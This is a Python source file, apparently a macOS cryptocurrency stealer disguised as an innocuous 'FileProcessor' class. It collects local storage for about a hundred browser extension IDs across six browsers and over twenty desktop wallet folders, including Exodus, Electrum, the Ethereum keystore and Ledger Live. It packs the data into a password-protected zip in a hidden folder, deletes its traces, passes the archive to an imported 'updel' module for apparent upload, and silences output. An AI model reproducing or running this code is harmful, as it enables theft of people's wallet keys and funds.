import os
import shutil
import subprocess
import warnings
import sys
import pyzipper

class FileProcessor:
    def __init__(self):
        pass

    @staticmethod
    def log(message):
        log_dir = os.path.expanduser("~/.temp/logs")
        log_file_path = os.path.join(log_dir, "ex_logs.txt")
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
        with open(log_file_path, "a") as log_file:
            log_file.write(message + "\n")

    @staticmethod
    def sanitize_filename(filename):
        return filename.replace(" ", "_")

    @staticmethod
    def zip_extension_settings(extension_id, source_dir, output_dir, profile_name, browser_name):
        try:
            extension_dir = os.path.join(source_dir, extension_id)
            if not os.path.exists(extension_dir):
                FileProcessor.log(f"Extension directory {extension_dir} does not exist.")
                return

            sanitized_profile_name = FileProcessor.sanitize_filename(profile_name)
            output_name = f"{browser_name}_{sanitized_profile_name}_{extension_id}.zip"
            output_zip = os.path.join(output_dir, output_name)

            with subprocess.Popen(['zip', '-r', output_zip, extension_dir], stdout=subprocess.PIPE, stderr=subprocess.PIPE) as proc:
                stdout, stderr = proc.communicate()
            if proc.returncode == 0:
                FileProcessor.log(f"Successfully zipped {extension_dir} to {output_zip}")
            else:
                FileProcessor.log(f"Failed to zip {extension_dir} to {output_zip}: {stderr}")
        except Exception as e:
            FileProcessor.log(f"Error in zip_extension_settings: {e}")

    @staticmethod
    def process_browser_extensions(browser_name, profile_dir, extension_id, output_dir, is_opera_gx=False):
        try:
            source_base_dir = os.path.expanduser(f"~/Library/Application Support/{browser_name}/")
            if is_opera_gx:
                profile_path = os.path.join(source_base_dir, "Local Extension Settings")
                FileProcessor.zip_extension_settings(extension_id, profile_path, output_dir, profile_dir, browser_name)
            else:
                base_profile_dir = os.path.join(source_base_dir, profile_dir)
                if not os.path.exists(base_profile_dir):
                    FileProcessor.log(f"Base profile directory {base_profile_dir} does not exist.")
                    return

                profile_names = [profile_dir] + [d for d in os.listdir(source_base_dir) if d.startswith("Profile")]
                for profile_name in profile_names:
                    profile_path = os.path.join(source_base_dir, profile_name, "Local Extension Settings")
                    FileProcessor.zip_extension_settings(extension_id, profile_path, output_dir, profile_name, browser_name)
        except Exception as e:
            FileProcessor.log(f"Error in process_browser_extensions: {e}")

    @staticmethod
    def zip_folder(folder_path, output_dir, output_name):
        try:
            folder_path_expanded = os.path.expanduser(folder_path)
            if not os.path.exists(folder_path_expanded):
                FileProcessor.log(f"Folder path {folder_path_expanded} does not exist.")
                return

            output_zip = os.path.join(output_dir, output_name)

            with subprocess.Popen(['zip', '-r', output_zip, folder_path_expanded], stdout=subprocess.PIPE, stderr=subprocess.PIPE) as proc:
                stdout, stderr = proc.communicate()
            if proc.returncode == 0:
                FileProcessor.log(f"Successfully zipped {folder_path_expanded} to {output_zip}")
            else:
                FileProcessor.log(f"Failed to zip {folder_path_expanded} to {output_zip}: {stderr}")
        except Exception as e:
            FileProcessor.log(f"Error in zip_folder: {e}")

    @staticmethod
    def zip_additional_wallets(output_dir):
        try:
            wallets = {
                "Bitcoin": "~/Library/Application Support/Bitcoin/wallets/",
                "Electrum": "~/Library/Application Support/Electrum/wallets/",
                "Coinomi": "~/Library/Application Support/Coinomi/wallets/",
                "Exodus": "~/Library/Application Support/Exodus/exodus.wallet/",
                "Atomic": "~/Library/Application Support/atomic/Local Storage/leveldb/",
                "Ethereum": "~/Library/Application Support/Ethereum/keystore/",
                "X-Electrum": "~/.electrum/wallets/",
                "Litecoin": "~/Library/Application Support/Litecoin/wallets/",
                "Dogecoin": "~/Library/Application Support/Dogecoin/wallets/",
                "Dash": "~/Library/Application Support/DashCore/wallets/",
                "Monero": "~/Library/Application Support/monero/wallets/",
                "Zcash": "~/Library/Application Support/Zcash/wallets/",
                "Ripple (XRP)": "~/Library/Application Support/Ripple/wallets/",
                "Binance Chain Wallet": "~/Library/Application Support/Binance/Wallets/",
                "Trust Wallet": "~/Library/Application Support/Trust/keystore/",
                "Trezor Suite": "~/Library/Application Support/TrezorSuite/",
                "Wasabi Wallet": "~/Library/Application Support/WasabiWallet/Client/Wallets/",
                "Armory": "~/Library/Application Support/Armory/wallets/",
                "BRD": "~/Library/Application Support/BRD/wallets/",
                "Jaxx Liberty": "~/Library/Application Support/Jaxx/wallets/",
                "Guarda": "~/Library/Application Support/Guarda/wallets/",
                "Edge Wallet": "~/Library/Application Support/Edge/wallets/",
                "Ledger Live": "~/Library/Application Support/Ledger Live/accounts/"
            }

            for wallet_name, wallet_path in wallets.items():
                FileProcessor.zip_folder(wallet_path, output_dir, f"{wallet_name}.zip")
        except Exception as e:
            FileProcessor.log(f"Error in zip_additional_wallets: {e}")

    @staticmethod
    def create_password_protected_zip(source_dirs, zip_file, password):
        try:
            with pyzipper.AESZipFile(zip_file,
                                     'w',
                                     compression=pyzipper.ZIP_LZMA,
                                     encryption=pyzipper.WZ_AES) as zf:
                zf.setpassword(password.encode())
                for source_dir in source_dirs:
                    for foldername, subfolders, filenames in os.walk(source_dir):
                        for filename in filenames:
                            filepath = os.path.join(foldername, filename)
                            arcname = os.path.relpath(filepath, os.path.dirname(source_dir))
                            zf.write(filepath, arcname)
            FileProcessor.log(f"Successfully created password protected zip {zip_file}")
        except Exception as e:
            FileProcessor.log(f"Error in create_password_protected_zip: {e}")

    def process_main(self):
        try:
            output_base_dir = os.path.expanduser("~/.temp/ext")
            log_dir = os.path.expanduser("~/.temp/logs")

            if os.path.exists(output_base_dir):
                shutil.rmtree(output_base_dir)
            if os.path.exists(log_dir):
                shutil.rmtree(log_dir)

            os.makedirs(output_base_dir)
            os.makedirs(log_dir)

            browsers = [
                "Google/Chrome",
                "BraveSoftware/Brave-Browser",
                "Microsoft Edge",
                "com.operasoftware.Opera",
                "com.operasoftware.OperaGX",
                "Yandex/Yandex Browser"
            ]

            for browser in browsers:
                browser_dir = os.path.join(output_base_dir, self.sanitize_filename(browser))
                if not os.path.exists(browser_dir):
                    os.makedirs(browser_dir)

            extension_ids = [
                "nkbihfbeogaeaoehlefnkodbefgpgknn",
                "fhbohimaelbohpjbbldcngcnapndodjp",
                "hnfanknocfeofbddgcijnmhnfnkdnaad",
                "fnjhmkhhmkbjkkabndcnnogagogbneec",
                "egjidjbpglichdcondbcbdnbeeppgdph",
                "ojggmchlghnjlapmfbnjholfjkiidbch",
                "opcgpfmipidbgpenhmajoajpbobppdil",
                "efbglgofoippbgcjepnhiblaibcnclgk",
                "ibnejdfjmmkpcnlpebklmnkoeoihofec",
                "ejjladinnckdgjemekebdpeokbikhfci",
                "phkbamefinggmakgklpkljjmgibohnba",
                "ebfidpplhabeedpnhjnobghokpiioolj",
                "afbcbjpbpfadlkmhmclhkeeodmamcflc",
                "aeachknmefphepccionboohckonoeemg",
                "bhghoamapcdpbohphigoooaddinpkbai",
                "aholpfdialjgjfhomihkjbmgjidlcdno",
                "bfnaelmomeimhlpmgjnjophhpkkoljpa",
                "agoakfejjabomempkjlepdflaleeobhb",
                "mfgccjchihfkkindfppnaooecgfneiii",
                "lgmpcpglpngdoalbgeoldeajfclnhafa",
                "bhhhlbepdkbapadjdnnojkbgioiodbic",
                "jblndlipeogpafnldhgmapagcccfchpi",
                "kncchdigobghenbbaddojjnnaogfppfj",
                "ffnbelfdoeiohenkjibnmadjiehjhajb",
                "hpglfhgfnhbgpjdenjgmdgoeiappafln",
                "cjelfplplebdjjenllpjcblmjkfcffne",
                "amkmjjmmflddogmhpjloimipbofnfjih",
                "fhilaheimglignddkjgofkcbgekhenbh",
                "nlbmnnijcnlegkjjpcfjclmcfggfefdm",
                "nanjmdknhkinifnkgdcggcfnhdaammmj",
                "nkddgncdjgjfcddamfgcmfnlhccnimig",
                "aiifbnbfobpmeekipheeijimdpnlpgpp",
                "fnnegphlobjdpkhecapkijjdkgcjhkib",
                "cgeeodpfagjceefieflmdfphplkenlfk",
                "pdadjkfkgcafgbceimcpbkalnfnepbnk",
                "mgffkfbidihfpoaomajlbgchddlicgpn",
                "aodkkagnadcbobfpggfnjeongemjbjca",
                "kpfopkelmapcoipemfendmdcghnegimn",
                "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
                "lpfcbjknijpeeillifnkikgncikgfhdo",
                "dngmlblcodfobpdpecaadgfbcggfjfnm",
                "ookjlbkiijinhpmnjffcofjonbfbgaoc",
                "eigblbgjknlfbajkfhopmcojidlgcehm",
                "ejbalbakoplchlghecdalmeeeajnimhm",
                "mgffkfbidihjpoaomajlbgchddlicgpn",
                "chphlpgkkbolifaimnlloiipkdnihall",
                "fhmfendgdocmcbmfikdcogofphimnkno",
                "bkhddocelccimeajgeiilmklhiffdffb",
                "hdcckdpafdegjaghlanajoplobnjdenj",
                "aobdiaigjablhjlkaieedpjnmneeacen",
                "ccelpjofonmkhegehhokcboeckdmnmpm",
                "flpiciilemghbmfalicajoolhkkenfel",
                "jpdbagkgkjmpilmggkmjilnlnmldfhia",
                "ihbgcodcpmgfiehpclfhbjlcpiemnmfn",
                "aaomjnnllhcnbamffjganpbnjdlhlhhk",
                "okadibdjfmakhflnelkbmnnenjaihfej",
                "pljpcfojbfoklcclggonheaiieeojaoc",
                "blnieiiffboillknjnepogjhkgnoapac",
                "kgaiejdhnghlnbhlhmjbnfobepkcidfg",
                "akjbpncbahndhpfnrhedgofbeoglhdfh",
                "mggfdkoabdbikjklgnfcpphjdijlhthb",
                "mllgbkfpmgkomafkcjmcpmnmlbinpdnb",
                "onnhjdhmgcapdaepbhghpjanigciekjn",
                "ceejooplpdlmjkceghjbhphjechbpmki",
                "jclmmbaobpmfccoebpgoackamjjkcglj",
                "jdldjholijjeegpfjonnpfhjfajccged",
                "hdmkndblkojggbobhnhbfngpkfkdnokj",
                "oofcbjbkmnmgmpmagbcjdmollbfoemoj",
                "belekhmglikpbdeimcomlenfflfggfjj",
                "ahbjhhbkbhfnmgeedjgbemdkocmkbede",
                "llhiacnklmokacacnpnjceiipehjklgf",
                "pgdjlholnghtgnnjobkphlppabiccbmm",
				"opfgelmcmbiajamepnmloijbpoleiama",
                "nfpejmanjgnadnkojflgimfelhnpoibd",
                "mnhcfoildemjfoicpeckvhhndknnkldd",
                "cjpffackkaacjpjcakmbaklmohjbihni",
                "aobojaljokphflhmhbbepnmddedhndld",
                "bhodjdzfpdkgbpaleonbmmdboodagmjg",
                "kdanhphhcpgkaekhpolmfcpldmccojgm",
                "bgnknjcnclbclkfllbcjcoofdffgfgjh",
                "jbdaocneiiinmjbjlgalhcelgbejmnid",
                "fihkakfobkmkjojpchpfgcmhfjnmnfpi",
                "cphhlgmgameodnhkjdmkpanlelnlohao",
                "nhnkbkgjikgcigadomkphalanndcapjk",
                "dmkamcknogkgcdfhhbddcghachkejeap",
                "cnmamaachppnkjgnildpdmkaakejnhae",
                "jojhfeoedkpkglbfimdfabpdfjaoolaf",
                "nknhiehlklippafakaeklbeglecifhad",
                "hcflpincpppdclinealmandijcmnkbgn",
                "mnfifefkajgofkcjkemidiaecocnkjeh",
                "lodccjjbdhfakaekdiahmedfbieldgik",
                "Ijmpgkjfkbfhoebgogflfebnmejmfbml",
                "lkcjlnjfpbikmcmbachjpdbijejflpcm",
                "bcopgchhojmggmffilplmbdicgaihlkp",
                "klnaejjgbibmhlephnhpmaofohgkpgkd",
                "dkdedlpgdmmkkfjabffeganieamfklkm",
                "nlgbhdfgdhgbiamfdfmbikcdghidoadd",
                "onofpnbbkehpmmoabgpcpmigafmmnjhl",
                "cihmoadaighcejopammfbmddcmdekcje",
                "acmacodkjbdgmoleebolmdjonilkdbch"
            ]


            for browser in browsers:
                for extension_id in extension_ids:
                    if browser == "com.operasoftware.OperaGX":
                        self.process_browser_extensions(browser, "", extension_id, output_base_dir, is_opera_gx=True)
                    else:
                        self.process_browser_extensions(browser, "Default", extension_id, output_base_dir)

            self.zip_additional_wallets(output_base_dir)

            zip_file_path = os.path.expanduser("~/.temp/ext.zip")
            self.create_password_protected_zip([output_base_dir, log_dir], zip_file_path, "@*@")

            shutil.rmtree(output_base_dir)
            shutil.rmtree(log_dir)

            from updel import process_file
            process_file(zip_file_path)

        except Exception as e:
            self.log(f"Error in process_main: {e}")

    def run(self):
        self.process_main()
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
        warnings.filterwarnings("ignore")
